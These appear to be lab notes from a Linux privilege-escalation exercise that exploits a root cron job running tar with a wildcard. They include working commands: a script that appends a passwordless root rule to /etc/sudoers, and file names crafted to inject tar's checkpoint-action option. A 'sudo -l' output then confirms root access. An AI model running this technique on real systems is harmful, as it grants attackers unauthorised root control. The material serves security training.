|**Character**|**Significance**|
|---|---|
|`*`|An asterisk that can match any number of characters in a file name.|
|`?`|Matches a single character.|
|`[ ]`|Brackets enclose characters and can match any single one at the defined position.|
|`~`|A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.|
|`-`|A hyphen within brackets will denote a range of characters.|

```shell
htb_student@NIX02:~$ man tar
```
![](Screenshot%202026-08-04%20at%2013.31.06.png)

```shell
# 
# mh dom mon dow command 
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

```shell
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh 
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh" 
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

We can check and see that the necessary files were created.

```shell
htb-student@NIX02:~$ ls -la
```
![](Screenshot%202026-08-04%20at%2013.33.28.png)

```shell
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02: 
	env_reset, mail_badpass, 
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 

User htb-student may run the following commands on NIX02: 
	(root) NOPASSWD: ALL
```
